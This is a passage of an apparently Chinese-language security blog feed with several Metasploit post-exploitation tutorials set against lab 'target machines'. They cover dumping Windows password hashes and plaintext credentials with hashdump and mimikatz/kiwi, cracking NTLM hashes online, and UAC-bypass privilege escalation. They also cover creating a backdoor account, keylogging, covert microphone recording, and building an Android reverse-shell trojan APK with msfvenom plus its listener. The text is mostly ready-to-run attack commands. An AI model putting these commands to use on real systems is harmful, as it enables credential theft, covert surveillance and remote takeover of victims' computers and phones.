&lt;p&gt;2  还可以通过导出SAM数据库中的本地用户账号（注意需要提权到SYSTEM）&lt;/p&gt;
&lt;p&gt;run post&amp;#x2F;windows&amp;#x2F;gather&amp;#x2F;smart_hashdump&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644493996549.png&#34; alt=&#34;1644493996549&#34;&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;用户名&lt;/th&gt;
&lt;th&gt;SID&lt;/th&gt;
&lt;th&gt;LM哈希:&lt;/th&gt;
&lt;th&gt;NTLM哈希1:::&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;mb&lt;/td&gt;
&lt;td&gt;1000&lt;/td&gt;
&lt;td&gt;aad3b435b51404eeaad3b435b51404ee&lt;/td&gt;
&lt;td&gt;32ed87bdb5fdc5e9cba88547376818d4&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;&lt;img data-src=&#34;/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644494007420.png&#34; alt=&#34;1644494007420&#34;&gt;&lt;/p&gt;
&lt;p&gt;3  使用  hashdump 获取密码（注意需要提权到SYSTEM才能使用）&lt;/p&gt;
&lt;p&gt;终端内输入  run hashdump&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644494019182.png&#34; alt=&#34;1644494019182&#34;&gt;&lt;/p&gt;
&lt;p&gt;使用在线解析工具  &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY21kNS5jb20v&#34;&gt;https://www.cmd5.com/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;NTLM哈希 例子：32ed87bdb5fdc5e9cba88547376818d4&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644494029236.png&#34; alt=&#34;1644494029236&#34;&gt;&lt;/p&gt;
&lt;p&gt;4  使用load kiwi（使用kiwi模块需要system权限）&lt;/p&gt;
&lt;p&gt;kiwi_cmd 模块可以让我们使用mimikatz的全部功能， mimikatz 的命令直接在kiwi_cmd里直接使用&lt;/p&gt;
&lt;p&gt;5.1 终端输入  load kiwi&lt;/p&gt;
&lt;p&gt;5.2 creds_all  直接获取密码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644494040171.png&#34; alt=&#34;1644494040171&#34;&gt;&lt;/p&gt;
&lt;p&gt;5.3 使用  kiwi_cmd sekurlsa::logonpasswords  获取密码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644494050257.png&#34; alt=&#34;1644494050257&#34;&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;ID&lt;/th&gt;
&lt;th&gt;kiwi参数和描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;creds_all：列举所有凭据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;creds_kerberos：列举所有kerberos凭据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;creds_msv：列举所有msv凭据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;creds_ssp：列举所有ssp凭据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;creds_tspkg：列举所有tspkg凭据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;6&lt;/td&gt;
&lt;td&gt;creds_wdigest：列举所有wdigest凭据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;7&lt;/td&gt;
&lt;td&gt;dcsync：通过DCSync检索用户帐户信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;8&lt;/td&gt;
&lt;td&gt;dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;9&lt;/td&gt;
&lt;td&gt;golden_ticket_create：创建黄金票据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;10&lt;/td&gt;
&lt;td&gt;kerberos_ticket_list：列举kerberos票据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;11&lt;/td&gt;
&lt;td&gt;kerberos_ticket_purge：清除kerberos票据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;12&lt;/td&gt;
&lt;td&gt;kerberos_ticket_use：使用kerberos票据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;13&lt;/td&gt;
&lt;td&gt;kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;14&lt;/td&gt;
&lt;td&gt;lsa_dump_sam：dump出lsa的SAM&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;15&lt;/td&gt;
&lt;td&gt;lsa_dump_secrets：dump出lsa的密文&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;16&lt;/td&gt;
&lt;td&gt;password_change：修改密码&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;17&lt;/td&gt;
&lt;td&gt;wifi_list：列出当前用户的wifi配置文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;18&lt;/td&gt;
&lt;td&gt;wifi_list_shared：列出共享wifi配置文件&amp;#x2F;编码&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
</content>
        <updated>2023-01-12T13:29:57.000Z</updated>
    </entry>
    <entry>
        <id>https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83Windows/</id>
        <title>后渗透之提权Windows</title>
        <link rel="alternate" href="https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83Windows/"/>
        <content type="html">&lt;h1 id=&#34;一、环境准备&#34;&gt;&lt;a href=&#34;#一、环境准备&#34; class=&#34;headerlink&#34; title=&#34;一、环境准备&#34;&gt;&lt;/a&gt;一、环境准备&lt;/h1&gt;&lt;p&gt;1 MSF-Metasploit Framework&lt;/p&gt;
&lt;p&gt;2 一台windiows靶机&lt;/p&gt;
&lt;h1 id=&#34;二、实战&#34;&gt;&lt;a href=&#34;#二、实战&#34; class=&#34;headerlink&#34; title=&#34;二、实战&#34;&gt;&lt;/a&gt;二、实战&lt;/h1&gt;&lt;p&gt;1 提权方法（Windows）查看当前获得用户的权限   meterpreter 中输入： getuid&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83.assets/1644493116225.png&#34; alt=&#34;1644493116225&#34;&gt;&lt;/p&gt;
&lt;p&gt;方法一、 meterpreter中输入：getsystem&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83.assets/1644493125642.png&#34; alt=&#34;1644493125642&#34;&gt;&lt;/p&gt;
&lt;p&gt;方法二、使用msf模块提权&lt;/p&gt;
&lt;p&gt;要想提权必须是已经拿到meterpreter  然后将当前meterpreter 后台 meterprerer中输入  background&lt;/p&gt;
&lt;p&gt;1、 查看可用模块  MSF终端中输入   search bypassuac   查看提权模块&lt;/p&gt;
&lt;p&gt;2、 选择一个适合当前系统的提权模块  我这边使用的是win10系统&lt;/p&gt;
&lt;p&gt;那我们使用：use  exploit&amp;#x2F;windows&amp;#x2F;local&amp;#x2F;bypassuac_windows_store_reg  尝试提权&lt;/p&gt;
&lt;p&gt;这个模块不行就换一个 use exploit&amp;#x2F;windows&amp;#x2F;local&amp;#x2F;bypassuac_sluihijack&lt;/p&gt;
&lt;p&gt;或者  use exploit&amp;#x2F;windows&amp;#x2F;local&amp;#x2F;bypassuac_dotnet_profiler&lt;/p&gt;
&lt;p&gt;3 配置模块使用参数   终端内输入： show options&lt;/p&gt;
&lt;p&gt;4 可以看到需要配置 session  终端内输入：set session  {需要提权的session id}&lt;/p&gt;
&lt;p&gt;5 执行提权  终端内输入：run&lt;/p&gt;
&lt;p&gt;6 获取到meterpreter后 我们在终端内 输入getuid 看实际还没有提权成功  需要在还终端内在输入 getsystem 获取权限 &lt;/p&gt;
&lt;p&gt;7 获取权限完成后 输入getuid 即可看到  已经获取到SYSTEM 最高权限了&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83.assets/1644493163472.png&#34; alt=&#34;1644493163472&#34;&gt;&lt;/p&gt;
&lt;p&gt;看到这个证明已经将权限提升成功&lt;/p&gt;
</content>
        <updated>2023-01-12T13:24:23.000Z</updated>
    </entry>
    <entry>
        <id>https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%B0%83%E7%94%A8%E9%9F%B3%E9%A2%91%E8%AE%BE%E5%A4%87%E5%BD%95%E9%9F%B3/</id>
        <title>后渗透之调用音频设备录音</title>
        <link rel="alternate" href="https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%B0%83%E7%94%A8%E9%9F%B3%E9%A2%91%E8%AE%BE%E5%A4%87%E5%BD%95%E9%9F%B3/"/>
        <content type="html">&lt;p&gt;一、环境准备&lt;br&gt;MSF-Metasploit Framework&lt;br&gt;一台安装手机或者模拟器&lt;br&gt;二、实践&lt;/p&gt;
&lt;p&gt;record_mic  包含4个可选参数 分别为&lt;/p&gt;
&lt;p&gt;-d  是设置录音时长的&lt;/p&gt;
&lt;p&gt;-f 设置未见路径的&lt;/p&gt;
&lt;p&gt;-h  查看帮助的&lt;/p&gt;
&lt;p&gt;-p  控制自动播放的&lt;/p&gt;
&lt;p&gt;一条简单的录音语句&lt;/p&gt;
&lt;p&gt;record_mic -d  10 -p true&lt;/p&gt;
</content>
        <updated>2023-01-12T13:20:15.000Z</updated>
    </entry>
    <entry>
        <id>https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7Windows/</id>
        <title>后渗透之创建账户Windows</title>
        <link rel="alternate" href="https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7Windows/"/>
        <content type="html">&lt;p&gt;一、环境准备&lt;/p&gt;
&lt;p&gt;1 MSF-Metasploit Framework&lt;/p&gt;
&lt;p&gt;2 一台获取到meterpreter的靶机&lt;/p&gt;
&lt;p&gt;二、实际操作&lt;/p&gt;
&lt;p&gt;1、先看下目标靶机已存在用户  meterpreter中输入：run post&amp;#x2F;windows&amp;#x2F;gather&amp;#x2F;enum_logged_on_users&lt;/p&gt;
&lt;p&gt;![1643108073546](22 后渗透之创建账户（Windows）.assets&amp;#x2F;1643108073546.png) &lt;/p&gt;
&lt;p&gt;2、使用getgui创建 一个用户名为 msb  密码为 123456  的账户&lt;/p&gt;
&lt;p&gt;run getgui -u msb -p 123456&lt;/p&gt;
&lt;p&gt;run getgui -u {用户名}-p {密码}&lt;/p&gt;
&lt;p&gt;进入win的运行输入netplwiz 可以查看账户创建情况&lt;/p&gt;
&lt;p&gt;![1643108092979](22 后渗透之创建账户（Windows）.assets&amp;#x2F;1643108092979.png)&lt;/p&gt;
&lt;p&gt;[-] Insufficient privileges, account was not be created. 看到这个提示就需要先提权（获取到system）&lt;/p&gt;
&lt;p&gt;2.1 绕过UAC提权&lt;/p&gt;
&lt;p&gt;use exploit&amp;#x2F;windows&amp;#x2F;local&amp;#x2F;&lt;em&gt;ask&lt;/em&gt;&lt;/p&gt;
</content>
        <updated>2023-01-12T13:17:00.000Z</updated>
    </entry>
    <entry>
        <id>https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95/</id>
        <title>后渗透之下载文件屏幕截图键盘记录</title>
        <link rel="alternate" href="https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95/"/>
        <content type="html">&lt;p&gt;第21课 ：后渗透之上传下载文件&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;center&#34;&gt;ID&lt;/th&gt;
&lt;th&gt;Command&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;1&lt;/td&gt;
&lt;td&gt;upload&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;传文件到靶机&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;2&lt;/td&gt;
&lt;td&gt;download&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;从靶机下载文件&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;第22课：后渗透之屏幕截图&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;ID&lt;/th&gt;
&lt;th&gt;Command&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;screenshot&lt;/td&gt;
&lt;td&gt;截图（Windows）&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;第23课：后渗透之键盘记录&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;ID&lt;/th&gt;
&lt;th&gt;Conmmand&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;keyscan_start&lt;/td&gt;
&lt;td&gt;启动键盘记录(Windows)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;keyscan_dump&lt;/td&gt;
&lt;td&gt;导出键盘(Windows)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;keyscan_stop&lt;/td&gt;
&lt;td&gt;停止键盘记录(Windows)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
</content>
        <updated>2023-01-12T13:08:41.000Z</updated>
    </entry>
    <entry>
        <id>https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%AE%BF%E9%97%AE%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/</id>
        <title>后渗透之访问文件系统</title>
        <link rel="alternate" href="https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%AE%BF%E9%97%AE%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"/>
        <content type="html">&lt;h1 id=&#34;一、后渗透之访问文件系统&#34;&gt;&lt;a href=&#34;#一、后渗透之访问文件系统&#34; class=&#34;headerlink&#34; title=&#34;一、后渗透之访问文件系统&#34;&gt;&lt;/a&gt;一、后渗透之访问文件系统&lt;/h1&gt;&lt;p&gt;1.文件交互指令&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;center&#34;&gt;ID&lt;/th&gt;
&lt;th align=&#34;left&#34;&gt;Command&lt;/th&gt;
&lt;th align=&#34;left&#34;&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;1&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;cat&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;读取文件内容&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;2&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;cd&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;切换靶机目录&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;3&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;cp&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;复制文件到目标&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;4&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;mv&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;移动到目标&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;5&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;chmod&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;修改文件权限（比如chmod 777 shell.elf）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;6&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;del &amp;#x2F; rm&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;删除靶机文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;7&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;dir&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;打印靶机目录&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;8&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;mkdir&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;在靶机上创建目录&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;9&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;rmdir&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;删除靶机目录&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;10&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;edit&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;编辑文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;11&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;getlwd&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;打印本地目录&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;12&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;getwd&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;打印靶机目录&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;13&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;lcd&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;更改本地目录&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;14&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;lls&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;列出本地目录&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;15&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;ls&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;列出靶机文件目录&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;16&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;lpwd&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;打印本地目录&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;17&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;pwd&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;打印工作目录&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;19&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;search&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;搜索文件 详情search -h&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;Linux权限理解&lt;/p&gt;
&lt;p&gt;chmod  777   {文件名.后缀}&lt;/p&gt;
&lt;p&gt;chmod  777    shell.elf&lt;/p&gt;
</content>
        <updated>2023-01-12T13:05:24.000Z</updated>
    </entry>
    <entry>
        <id>https://mangpumo.github.io/2023/01/12/%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E5%8F%8D%E5%BC%B9shell-Android/</id>
        <title>生成木马反弹shell_Android</title>
        <link rel="alternate" href="https://mangpumo.github.io/2023/01/12/%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E5%8F%8D%E5%BC%B9shell-Android/"/>
        <content type="html">&lt;h1 id=&#34;一、环境准备&#34;&gt;&lt;a href=&#34;#一、环境准备&#34; class=&#34;headerlink&#34; title=&#34;一、环境准备&#34;&gt;&lt;/a&gt;一、环境准备&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;MSF-Metasploit Framework&lt;/li&gt;
&lt;li&gt;一台安装手机或者模拟器&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;二、木马生成&#34;&gt;&lt;a href=&#34;#二、木马生成&#34; class=&#34;headerlink&#34; title=&#34;二、木马生成&#34;&gt;&lt;/a&gt;二、木马生成&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;生成一个APK后门&lt;/li&gt;
&lt;li&gt;msfvenom -p android&amp;#x2F;meterpreter&amp;#x2F;reverse_tcp LHOST&amp;#x3D;{监控IP} LPORT&amp;#x3D;{监控端口} R&amp;gt;k.apk。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;msfvenom -p android&amp;#x2F;meterpreter&amp;#x2F;reverse_tcp LHOST&amp;#x3D;192.168.110.38  LPORT&amp;#x3D;4567 R&amp;gt;k.apk&lt;/p&gt;
&lt;h1 id=&#34;三、配置监控&#34;&gt;&lt;a href=&#34;#三、配置监控&#34; class=&#34;headerlink&#34; title=&#34;三、配置监控&#34;&gt;&lt;/a&gt;三、配置监控&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;启动msf   终端内输入：msfconsole 启动msf![1643003592876](21 通过木马反弹shell（Android）.assets&amp;#x2F;1643003592876.png)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;载入监控模块  msf中输入：  use exploit&amp;#x2F;multi&amp;#x2F;handler&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;载入payload MSF终端中输入： set payload android&amp;#x2F;meterpreter&amp;#x2F;reverse_tcp&lt;/p&gt;
&lt;p&gt;![1643003612323](21 通过木马反弹shell（Android）.assets&amp;#x2F;1643003612323.png)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;配置payload  MSF终端中输入：show options&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;配置监控IP MSF中输入：set lhost  &amp;lt;监控的IP&amp;gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;配置监控端口  MSF中输入：set lporr  &amp;lt;监控的端口&amp;gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;执行监控  msf终端中输入： run![1643003633911](21 通过木马反弹shell（Android）.assets&amp;#x2F;1643003633911.png)&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;四、攻击利用&#34;&gt;&lt;a href=&#34;#四、攻击利用&#34; class=&#34;headerlink&#34; title=&#34;四、攻击利用&#34;&gt;&lt;/a&gt;四、攻击利用&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;将木马上传到靶机&lt;/li&gt;
&lt;li&gt;在靶机上执行木马&lt;/li&gt;
&lt;li&gt;完成攻击利用![1643003654523](21 通过木马反弹shell（Android）.assets&amp;#x2F;1643003654523.png)&lt;/li&gt;
&lt;/ol&gt;
</content>
        <updated>2023-01-12T08:04:52.000Z</updated>
    </entry>
</feed>
